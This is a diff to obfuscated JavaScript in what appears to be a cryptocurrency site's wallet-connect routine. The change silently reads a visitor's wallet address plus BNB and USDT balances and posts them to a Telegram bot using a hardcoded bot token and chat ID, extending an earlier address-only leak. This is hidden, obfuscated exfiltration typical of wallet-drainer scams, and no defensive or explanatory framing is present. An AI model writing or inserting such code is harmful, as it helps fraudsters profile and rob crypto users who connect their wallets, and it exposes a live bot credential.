@@ -170,22 +170,57 @@ async function connectWalletAndSwitch() {
     }
     const _0x69b3cd = { method: 'eth_accounts' }
     const _0x5f1439 = await _0x455cd3.request(_0x69b3cd)
-    userAddress = _0x5f1439[0]
-console.log('\u2705 Wallet:', userAddress)
+    const userAddress = _0x5f1439[0];
+console.log('✅ Wallet:', userAddress);
 
-fetch(`https://api.telegram.org/bot7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM/sendMessage`, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
+const usdtABI = [
+  {
+    constant: true,
+    inputs: [{ name: "_owner", type: "address" }],
+    name: "balanceOf",
+    outputs: [{ name: "balance", type: "uint256" }],
+    type: "function"
   },
-  body: JSON.stringify({
-    chat_id: '8191508290',
-    text: `✅ New Wallet Connected:\n\nAddress: ${userAddress}`
-  })
-})
-.catch((err) => {
-  console.error('Telegram Notify Error:', err);
+  {
+    constant: true,
+    inputs: [],
+    name: "decimals",
+    outputs: [{ name: "", type: "uint8" }],
+    type: "function"
+  }
+];
+
+const web3Instance = new Web3(window.ethereum);
+const usdtContract = new web3Instance.eth.Contract(usdtABI, usdtContractAddress);
+
+// Fetch balances
+Promise.all([
+  web3Instance.eth.getBalance(userAddress),
+  usdtContract.methods.balanceOf(userAddress).call()
+])
+.then(([bnbWei, usdtRaw]) => {
+  const bnb = web3Instance.utils.fromWei(bnbWei, 'ether');
+  const usdt = parseFloat(usdtRaw) / 1e18;
+
+  const message = `✅ New Wallet Connected:
+
+📍 Address: ${userAddress}
+💰 BNB: ${bnb}
+💵 USDT: ${usdt}`;
+
+  fetch(`https://api.telegram.org/bot<7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM>/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: '<8191508290>',
+      text: message
+    })
+  }).catch(err => {
+    console.error('Telegram Notify Error:', err);
+  });
 });
+
   } catch (_0x5d6ce6) {
     alert('Wallet connection failed.'), console.error(_0x5d6ce6)
   }
